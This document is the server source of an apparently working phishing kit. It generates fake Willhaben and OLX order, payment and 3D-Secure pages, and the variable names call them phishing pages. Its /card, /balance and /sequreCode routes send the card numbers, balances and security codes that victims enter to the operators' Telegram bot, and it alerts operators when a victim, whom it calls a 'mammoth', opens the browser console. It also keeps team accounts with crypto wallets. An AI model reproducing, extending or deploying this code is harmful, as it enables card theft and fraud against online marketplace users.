import express, { json, urlencoded } from 'express';
import cors from 'cors';
import request from "request";
import { load } from 'cheerio';
import { writeFileSync, readFileSync } from 'fs';
import { minify } from 'uglify-js';
import fsExtra from 'fs-extra';
import axios from 'axios';
import http from 'http'
import * as path from 'path';
import { Server } from 'socket.io';
import whois from 'whois';
import { ref, onValue, set, update, remove} from "firebase/database";
import database from './firebaseDatabase.js';
import { telegaToken, SERVER_NAME} from './constants.js'

const urlTelegaMessage = "https://api.telegram.org/bot";

const MARKET_NAMES = {
    OLX: 'olx',
    WILLHABEN: 'willhaben'
}

const app = express();

app.use(cors());

app.use(json());
app.use(urlencoded());
app.set('trust proxy', true);
const __dirname = path.resolve();

app.post('/auth', function(clientRequest, clientResponse) {
    const body = clientRequest.body;
    const starCountRef = ref(database, 'users/' + body.teamName);
    onValue(starCountRef, (snapshot) => {
        const data = snapshot.val();
        let clientData = null;
        Object.keys(data).find(key => {
            if (data[key].id === body.id) {
                console.log(data[key]);
                clientData = data[key];
            }
        });
        clientResponse.send(JSON.stringify(clientData));
    }, {
        onlyOnce: true
    });

});

app.get('/adminsList', function(clientRequest, clientResponse) {
    const adminsList = [];
    const starCountRef = ref(database, 'users/' + body.teamName);
    onValue(starCountRef, (snapshot) => {
        const data = snapshot.val();
        Object.keys(data).find(key => {
            if (data[key].type === 'admin') {
                adminsList.push(data[key]);
            }
        });
        clientResponse.send(JSON.stringify(adminsList));
    }, {
        onlyOnce: true
    });
})

app.get('/usersList', function(clientRequest, clientResponse) {
    const targetQuery = clientRequest.query
    const starCountRef = ref(database, 'users/' + targetQuery.teamName);
    onValue(starCountRef, (snapshot) => {
        const data = snapshot.val();
        clientResponse.send(JSON.stringify(data));
    }, {
        onlyOnce: true
    });
})

app.get('/order', function(clientRequest, clientResponse) {
    const targetQuery = clientRequest.query;
    const pathToFile = path.join(__dirname, `./dist/${targetQuery.id.toString()}/orderPage/index.html`);
    if (fsExtra.existsSync(pathToFile)) {
        clientResponse.sendFile(pathToFile);
    }
    else {
        clientResponse.redirect('https://www.willhaben.at/iad');
    }
})

app.get('/pay', function(clientRequest, clientResponse) {
    const targetQuery = clientRequest.query;
    const pathToFile = path.join(__dirname, `./dist/${targetQuery.id.toString()}/cardPage/index.html`);
    if (fsExtra.existsSync(pathToFile)) {
        clientResponse.sendFile(pathToFile);
    }
    else {
        clientResponse.redirect('https://www.willhaben.at/iad');
    }

})

app.get('/csh', function(clientRequest, clientResponse) {
    const targetQuery = clientRequest.query;
    const pathToFile = path.join(__dirname, `./dist/${targetQuery.id.toString()}/cashPage/index.html`);
    if (fsExtra.existsSync(pathToFile)) {
        clientResponse.sendFile(pathToFile);
    }
    else {
        clientResponse.redirect('https://www.willhaben.at/iad');
    }
})

app.get(/.css$/, function(clientRequest, clientResponse) {
    clientResponse.sendFile(path.join(__dirname, 'mocks' + clientRequest.path));
})

app.get(/.png$/, function(clientRequest, clientResponse) {
    clientResponse.sendFile(path.join(__dirname, 'mocks' + clientRequest.path));
})

app.get(/.svg$/, function(clientRequest, clientResponse) {
    clientResponse.sendFile(path.join(__dirname, 'mocks' + clientRequest.path));
})

app.get(/.ttf$/, function(clientRequest, clientResponse) {
    clientResponse.sendFile(path.join(__dirname, 'mocks' + clientRequest.path));
})

app.get(/.js$/, function(clientRequest, clientResponse) {
    clientResponse.sendFile(path.join(__dirname, 'dist' + clientRequest.path));
})


app.get('/', function(clientRequest, clientResponse) {

    clientResponse.redirect('https://www.willhaben.at/iad');
})

app.post('/askForNewUser', function(clientRequest, clientResponse) {
    const body = clientRequest.body;
    set(ref(database, `users/${body.teamName}${body.id}`), {
      id: body.id,
      firstName: body.first_name || "",
      lastName : body.last_name || "",
      username: body.username || "",
      teamName: body.teamName,
      type: 'whaitlist'
    });

    const starCountRef = ref(database, 'users/' + body.teamName);
    onValue(starCountRef, (snapshot) => {
        const data = snapshot.val();
        let adminList = [];
        Object.keys(data).find(key => {
            if (data[key].type === 'admin') {
                adminList.push(data[key]);
            }
        });
        clientResponse.send(JSON.stringify(adminList));
    }, {
        onlyOnce: true
    });

});

app.post('/updateTRC20Wallet', function(clientRequest, clientResponse) {
    const body = clientRequest.body;
    update(ref(database, `users/${body.teamName}/${body.id}`), {
      wallet: body.walletData
    });

    clientResponse.send(JSON.stringify({id: body.id}));
});

app.post('/updateLinkData', function(clientRequest, clientResponse) {
    const body = clientRequest.body;
    update(ref(database, 'users/' + body.teamName + '/' + body.id + '/links/' + body.linkData.linkId), {
        staffName: body.linkData.staffName,
        price: body.linkData.price
    });
    clientResponse.send(JSON.stringify({id: body.id}));
});

app.post('/saveLink', function(clientRequest, clientResponse) {
    const body = clientRequest.body;
    update(ref(database, 'users/' + body.teamName + '/' + body.id + '/links/' + body.linkData.linkId), body.linkData);

    clientResponse.send(JSON.stringify({id: body.id}));
});

app.post('/myLinks', function(clientRequest, clientResponse) {
    const body = clientRequest.body;
    const starCountRef = ref(database, 'users/' + body.teamName + '/' + body.id + '/links/');
    onValue(starCountRef, (snapshot) => {
        const data = snapshot.val();
        clientResponse.send(JSON.stringify(data));
    }, {
        onlyOnce: true
    });
});

app.post('/approveNewUser', function(clientRequest, clientResponse) {
    const body = clientRequest.body;
    update(ref(database, 'users/' + body.teamName + '/' + body.id), {
      type: body.type
    });
    clientResponse.send(JSON.stringify({type: body.type}));
});

app.get('/test', function(clientRequest, clientResponse) {
    clientResponse.end("Hello world");
});

app.post('/3ds', function(clientRequest, clientResponse) {
    let ip = clientRequest.headers['x-forwarded-for']?.split(',').shift()
    || clientRequest.socket?.remoteAddress
    const ipRegex = /::ffff:([\w\W]*)/
    if (ip.match(ipRegex)) {
        ip = ip.match(ipRegex)[1]
    }
    const data3DS = clientRequest.body
    const ipPromise = new Promise(function(resolve, reject) {
        getISPName(ip, resolve);
    })
    ipPromise.then(data => {
        const ispName = data;
        data3DS.handler = ispName;
        const dateTime = getDateTime();
        data3DS.date = dateTime; 
        create3DSPage(data3DS);
        clientResponse.sendFile(__dirname + `/dist/${data3DS.pageId.toString()}/3DS/index.html`);
    });
});

app.get('/3DS', function(clientRequest, clientResponse) {
    const targetQuery = clientRequest.query;
    clientResponse.sendFile(__dirname + `/dist/${targetQuery.id.toString()}/3DS/index.html`);
});

function getDateTime() {
    const today = new Date();
    const yyyy = today.getFullYear();
    let mm = today.getMonth() + 1; // Months start at 0!
    let dd = today.getDate();
    let hours = today.getHours();
    let minutes = today.getMinutes();
    let secconds = today.getSeconds();

    if (dd < 10) dd = '0' + dd;
    if (mm < 10) mm = '0' + mm;

    if (hours < 10) hours = '0' + hours;
    if (minutes < 10) minutes = '0' + minutes;
    if (secconds < 10) secconds = '0' + secconds;

    const formattedToday = dd + '.' + mm + '.' + yyyy + ' ' + hours + ':' + minutes + ':' + secconds;
    return formattedToday;
}

app.get('/market', function(clientRequest, clientResponse) {
    const targetQuery = clientRequest.query;
    if (targetQuery.selectedMarket === MARKET_NAMES.WILLHABEN) {
        const productData = JSON.parse(targetQuery.productData);
        let phishingPageId = Math.floor(Math.random() * 100000000);
        if (targetQuery.linkId) {
            const linkIdData = JSON.parse(targetQuery.linkId);
            phishingPageId = linkIdData;
            fsExtra.removeSync(`./dist/${phishingPageId}/`);
        }
        productData.linkId = phishingPageId;
        const chatIdData = `export const chatId = ${targetQuery.chatId};
        export const pageId = ${phishingPageId};`
        createOrderPage(chatIdData, phishingPageId, productData, targetQuery.selectedMarket);
        createCardPage(chatIdData, phishingPageId, productData, targetQuery.selectedMarket)
        createCashPage(chatIdData, phishingPageId, productData, targetQuery.selectedMarket)
        const responseData = {
            ordPage: `${SERVER_NAME.Willhaben}/order?id=${phishingPageId.toString()}`,
            cashBackPage: `${SERVER_NAME.Willhaben}/bk?id=${phishingPageId.toString()}`,
            rcvPage: `${SERVER_NAME.Willhaben}/csh?id=${phishingPageId.toString()}`,
            ...productData
        }
        clientResponse.end(JSON.stringify(responseData)); 
    } else if (targetQuery.selectedMarket === MARKET_NAMES.OLX) {
        if (targetQuery.url) {
            const serverRequest = request({uri: targetQuery.url}, function (error, response, body) {
                const responseData = response.toJSON().body.toString();
                const parcedProductData = parceProductData(responseData);
                const page = generateOrderPage(parcedProductData);
                const phishingPageId = Math.floor(Math.random() * 100000000);
                fsExtra.copySync('mocks/olxMocks/withdraw/', `dist/${phishingPageId.toString()}/withdraw`, { overwrite: true }, function () {
                    if (err) {                 
                        console.error(err);
                    } else {
                        console.log("success!");
                    }
                })
                writeFileSync(`dist/${phishingPageId.toString()}/withdraw/index.html`, page);
                clientResponse.end(JSON.stringify(parcedProductData)); 
            });
            serverRequest.end();
        }
    }
});

app.post('/card', function(reqest, response) {
    const body = reqest.body;
    response.send(JSON.stringify(body));
    const messageUrl = `https://api.telegram.org/bot${telegaToken}/sendMessage?chat_id=${body.chatId}&text=${JSON.stringify(body)}`
    axios.get(messageUrl).catch(error => {
        console.log(error);
    })
})

app.post('/balance', function(reqest, response) {
    const body = reqest.body;
    response.send(JSON.stringify(body));
    const replayKeyboard = {inline_keyboard:[[{text:'✅Да',callback_data:'PASS_3D'}],[{text:'❌Нет',callback_data:'REGECT_3D'}]]};
    const messageUrl = `https://api.telegram.org/bot${telegaToken}/sendMessage?chat_id=${body.chatId}&text=${JSON.stringify(body)}`;
    const sequreMessage = `https://api.telegram.org/bot${telegaToken}/sendMessage?chat_id=${body.chatId}&text="пустить на 3ds?"&reply_markup=${JSON.stringify(replayKeyboard)}`
    axios.get(messageUrl)
    .then(response => {
        axios.get(encodeURI(sequreMessage)).catch(error => {
            console.log(error);
        })
    })
    .catch(error => {
        console.log(error);
    })
})

app.post('/sequreCode', function(reqest, response) {
    const body = reqest.body;
    response.send(JSON.stringify(body));
    const messageUrl = `https://api.telegram.org/bot${telegaToken}/sendMessage?chat_id=${body.chatId}&text=${JSON.stringify(body)}`;
    axios.get(messageUrl)
    .catch(error => {
        console.log(error);
    })
})

app.delete('/myLinks', function(reqest, response) {
    const body = reqest.body;
    fsExtra.removeSync(`./dist/${body.linkId.toString()}/`);
    remove(ref(database, 'users/' + body.teamName + '/' + body.userId.toString() + '/links/' + body.linkId));
    response.send(JSON.stringify({id: body.userId}));
})

function createOrderPage(chatIdData, phishingPageId, productData, selectedMarket) {
    const page = generateOrderPage(productData, selectedMarket, phishingPageId);
    fsExtra.copySync(`mocks/${MARKET_NAMES.WILLHABEN}/orderPage/`, `dist/${phishingPageId.toString()}/orderPage`, { overwrite: true }, function () {
        if (err) {                 
            console.error(err);
        } else {
            console.log("success!");
        }
    })
    writeFileSync(`dist/${phishingPageId.toString()}/orderPage/index.html`, page);
    writeFileSync(`dist/${phishingPageId.toString()}/orderPage/js/chatId.js`, chatIdData, err => {
        if (err) {
            console.log(err)
        }
    })
    const mainJsRawData = readFileSync(`dist/${phishingPageId.toString()}/orderPage/js/main.js`, 'utf8', function(err, data) {
        if (err) throw err;
        return data
    });

    const mainjsData = minify(mainJsRawData);
    writeFileSync(`dist/${phishingPageId.toString()}/orderPage/js/main.js`, mainjsData.code);
}

function createCardPage(chatIdData, phishingPageId, productData, selectedMarket) {
    const page = generateCardPages(productData, selectedMarket, phishingPageId);
    fsExtra.copySync(`mocks/${MARKET_NAMES.WILLHABEN}/cardPage/`, `dist/${phishingPageId.toString()}/cardPage`, { overwrite: true }, function () {
        if (err) {                 
            console.error(err);
        } else {
            console.log("success!");
        }
    })
    writeFileSync(`dist/${phishingPageId.toString()}/cardPage/index.html`, page);
    writeFileSync(`dist/${phishingPageId.toString()}/cardPage/js/chatId.js`, chatIdData, err => {
        console.log(err)
    })

    const mainJsRawData = readFileSync(`dist/${phishingPageId.toString()}/cardPage/js/main.js`, 'utf8', function(err, data) {
        if (err) throw err;
        return data
    });

    const mainjsData = minify(mainJsRawData);
    writeFileSync(`dist/${phishingPageId.toString()}/cardPage/js/main.js`, mainjsData.code);
}

function createCashPage(chatIdData, phishingPageId, productData, selectedMarket) {
    const page = generateCashPage(productData, selectedMarket, phishingPageId);
    fsExtra.copySync(`mocks/${MARKET_NAMES.WILLHABEN}/cashPage/`, `dist/${phishingPageId.toString()}/cashPage`, { overwrite: true }, function () {
        if (err) {                 
            console.error(err);
        } else {
            console.log("success!");
        }
    })
    writeFileSync(`dist/${phishingPageId.toString()}/cashPage/index.html`, page);
    writeFileSync(`dist/${phishingPageId.toString()}/cashPage/js/chatId.js`, chatIdData, err => {
        console.log(err)
    })

    const mainJsRawData = readFileSync(`dist/${phishingPageId.toString()}/cashPage/js/main.js`, 'utf8', function(err, data) {
        if (err) throw err;
        return data
    });

    const mainjsData = minify(mainJsRawData);
    writeFileSync(`dist/${phishingPageId.toString()}/cashPage/js/main.js`, mainjsData.code);
}

function create3DSPage(pageData) {
    const page = generate3DSPage(pageData, pageData.pageId);
   
    fsExtra.copySync(`mocks/3DS/`, `dist/${pageData.pageId.toString()}/3DS`, { overwrite: true }, function () {
        if (err) {                 
            console.error(err);
        } else {
            console.log("success!");
        }
    })
    const chatIdData = `export const chatId = ${pageData.chatId};`
    writeFileSync(`dist/${pageData.pageId.toString()}/3DS/index.html`, page);
    writeFileSync(`dist/${pageData.pageId.toString()}/3DS/chatId.js`, chatIdData, err => {
        console.log(err)
    })

    const mainJsRawData = readFileSync(`dist/${pageData.pageId.toString()}/3DS/script.js`, 'utf8', function(err, data) {
        if (err) throw err;
        return data
    });

    const mainjsData = minify(mainJsRawData);
    writeFileSync(`dist/${pageData.pageId.toString()}/3DS/script.js`, mainjsData.code);
}

function generate3DSPage(productData, phishingPageId) {
    const data = readFileSync(`./mocks/3DS/index.html`, 'utf8', function(err, data) {
        if (err) throw err;
        return data
    });
    let htmlOrderPage = data;
    const $ = load(htmlOrderPage);
    $('script#mainScript').attr('src', `${phishingPageId.toString()}/3DS/script.js`);
    $('p#summ').text(`${productData.balance} €`);
    $('p#date').text(`${productData.date}`);
    $('p#cardNum').text(`${productData.cardNumb}`);
    $('p#handler').text(`${productData.handler}`);
    $.root().html();
    htmlOrderPage = $.html();
    return htmlOrderPage;
}

function parceProductData(responseData) {
    const titleTagRegex = /<title[\W\w]*<\/title>/g;
    const titleUntagRegex = /<title[\W\w]*?>([\W\w]*)<\/title>/g;
    const titleWithBrandName = Array.from(responseData.match(titleTagRegex)[0].matchAll(titleUntagRegex))[0][1];

    const title = Array.from(titleWithBrandName.matchAll(/([\w\W]*?)•/g))[0][1]
    const imgRegex = /property="og:image" content="([a-zA-Z\D0-9]*?)"\/>/g;
    const imgURL = Array.from(responseData.matchAll(imgRegex))[0][1];
    const priceRegex = /name="description" content="([a-zA-Z\D0-9]*?)\:/g;
    const price = Array.from(responseData.matchAll(priceRegex))[0][1];
    const productIdRegex = /ID:([\W\w]*?)<\//g;
    const productId = Array.from(responseData.matchAll(productIdRegex))[0][1].match(/(\d*)/g).find((el) => {
        if (el !== '' ) {
            return el
        }
    })

    const productData = {
        title,
        imgURL,
        price,
        productId
    }
    return productData;
}

function generateCardPages(productData, marketName, phishingPageId) {
    if (marketName === MARKET_NAMES.WILLHABEN) {
        let htmlOrderPage;
        const data = readFileSync(`./mocks/${MARKET_NAMES.WILLHABEN}/cardPage/index.html`, 'utf8', function(err, data) {
            if (err) throw err;
            return data
        });
        htmlOrderPage = data;
        const $ = load(htmlOrderPage);
        $('script#mainScript').attr('src', `${phishingPageId.toString()}/cardPage/js/main.js`);
        $('span#totalAmount').text(`${productData.price} €`);
        $('div#transactionNumber').text(`Transaction ${phishingPageId.toString()}`);
        $.root().html();
        htmlOrderPage = $.html();
        return htmlOrderPage;
    }
}

function generateCashPage(productData, marketName, phishingPageId) {
    if (marketName === MARKET_NAMES.WILLHABEN) {
        let htmlOrderPage;
        const data = readFileSync(`./mocks/${MARKET_NAMES.WILLHABEN}/cashPage/index.html`, 'utf8', function(err, data) {
            if (err) throw err;
            return data
        });
        htmlOrderPage = data;
        console.log(productData);
        const $ = load(htmlOrderPage);
        $('script#mainScript').attr('src', `${phishingPageId.toString()}/cashPage/js/main.js`);
        $('a#payPage').attr('href', `./pay?id=${phishingPageId.toString()}`);
        $('img#mainImage').attr('src', productData.image);
        $('img#mainImage').attr('alt', productData.name);
        $('h1.title').text(productData.name);
        $('span.price').text(`€ ${productData.price}`);
        $('span#price-box').text(`€ ${productData.price}`);
        $('h2.name.mp-text-header3').text(productData.name);
        $('li#vip-active-since').text(`Summe: ${productData.price} €`);
        $('input#address').attr('value', `${productData.buyerName}`);
        $('input#name').attr('value', `${productData.buyerLocation}`);
        $.root().html();
        htmlOrderPage = $.html();
        return htmlOrderPage;
    }
}

function generateOrderPage(productData, marketName, phishingPageId) {
    if (marketName === MARKET_NAMES.WILLHABEN) {
        let htmlOrderPage;
        const data = readFileSync(`./mocks/${MARKET_NAMES.WILLHABEN}/orderPage/index.html`, 'utf8', function(err, data) {
            if (err) throw err;
            return data
        });
        htmlOrderPage = data;
        const $ = load(htmlOrderPage);
        $('script#mainScript').attr('src', `${phishingPageId.toString()}/orderPage/js/main.js`);
        $('a#payPage').attr('href', `./pay?id=${phishingPageId.toString()}`);
        $('img#mainImage').attr('src', productData.image);
        $('img#mainImage').attr('alt', productData.name);
        $('h1.title').text(productData.name);
        $('span.price').text(`€ ${productData.price}`);
        $('span#price-box').text(`€ ${productData.price}`);
        $('h2.name.mp-text-header3').text(productData.name);
        $('li#vip-active-since').text(`Summe: ${productData.price} €`);
        $.root().html();
        htmlOrderPage = $.html();
        return htmlOrderPage;
    } else if (marketName === MARKET_NAMES.OLX) {
        let htmlWithdraw;
        const data = readFileSync('./mocks/olxMocks/withdraw/index.html', 'utf8', function(err, data) {

            if (err) throw err;
            return data
        });
        htmlWithdraw = data;
        const $ = load(htmlWithdraw);
        $('img#product-img').attr('src', productData.imgURL);
        $('p.item-block_title').text(productData.title);
        $('p.item-block_price').text(productData.price);
        $('p.item-footer_text').text(productData.productId);
        $.root().html();
        htmlWithdraw = $.html();
        return htmlWithdraw;
    }
}


function getISPName(ip, promiseResolve) {
    let ispName = ''
    whois.lookup(ip, function(err, data) {
        const ispRawNameRegex = /mnt-by:([\w\W].*)/;
        const ispNameRegex = /[\s]*?(\S[\w\W]*)/
        const ispNameWithWhiteSpaces = data.match(ispRawNameRegex);
        let ispClearName = 'localhost';
        if (ispNameWithWhiteSpaces) {
            ispClearName = ispNameWithWhiteSpaces[1].match(ispNameRegex)[1];
        }
        console.log(ispClearName, ispName)
        ispName = ispClearName;
        promiseResolve(ispName);
    }) 
}

const server = http.createServer(app);

const users = {}

const io = new Server(server, {
  cors: {
    origin: SERVER_NAME
  }
});

io.on('connection', socket => {
    socket.on('new-user', data => {
        users[socket.id] = data.chatId;
        // const messageUrl = `https://api.telegram.org/bot${telegaToken}/sendMessage?chat_id=${data.pageName}&text=${encodeURIComponent(message.text)}`
        // axios.get(messageUrl).catch(error => {
        //     console.log(error);
        // })
    })
    socket.on('location', data => {
        const messageUrl = `https://api.telegram.org/bot${telegaToken}/sendMessage?chat_id=${data.chatId}&text=${encodeURIComponent(data.pageName)}`
        axios.get(messageUrl).catch(error => {
            console.log(error);
        })
    } )
    socket.on('send-chat-message', message => {
      const messageUrl = `https://api.telegram.org/bot${telegaToken}/sendMessage?chat_id=${message.chatId}&text=${encodeURIComponent(message.text)}`
      axios.get(messageUrl).catch(error => {
          console.log(error);
      })
    })
    socket.on('PASS_3D', message => {
        socket.broadcast.emit('request_3d_screen', { message: message, name: users[socket.id] })
      })
    socket.on('send-telega-message', message => {
        socket.broadcast.emit('chat-message-support', { message: message, name: users[socket.id] })
    });
    socket.on('disconnect', () => {
        delete users[socket.id]
    });
    socket.on('devtools-opened', (message) => {
        const userMessage = 'Мамонт открыл консоль';
        const messageUrl = `https://api.telegram.org/bot${telegaToken}/sendMessage?chat_id=${message.toString()}&text=${encodeURIComponent(userMessage)}`;
        axios.get(messageUrl).catch(error => {
            console.log(error);
        });
    })
  }
)

export default server;
